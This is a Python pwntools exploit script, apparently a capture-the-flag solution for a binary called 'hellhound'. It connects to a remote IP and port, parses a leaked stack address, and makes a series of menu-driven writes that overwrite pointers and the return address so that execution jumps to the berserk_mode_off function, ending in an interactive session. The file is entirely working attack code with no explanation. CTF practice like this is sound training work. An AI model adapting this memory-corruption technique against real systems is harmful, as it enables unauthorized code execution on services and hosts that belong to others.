#!/usr/bin/env python3

from pwn import *

e = ELF("./hellhound_patched")
libc = ELF("./libc.so.6")
#r = process("./hellhound_patched")
r = remote("138.68.139.197",30703)
r.sendlineafter('>> ','1')
r.recvuntil('number: [')
stack_leak = int(r.recv(15).decode('latin-1'))
log.info(f'stack leak: {hex(stack_leak)}')

ret_address = stack_leak + 80
exploit = p64(0x21) + p64(stack_leak + 0x80) + p64(0) * 2
r.sendlineafter(b">>",'2')
r.sendafter(b"code:",b'A'*8 + p64(stack_leak + 0x60))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",exploit)
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",p64(0x21) + p64(ret_address))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",p64(e.sym.berserk_mode_off) + p64(stack_leak + 0x68))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b"69")
r.interactive()
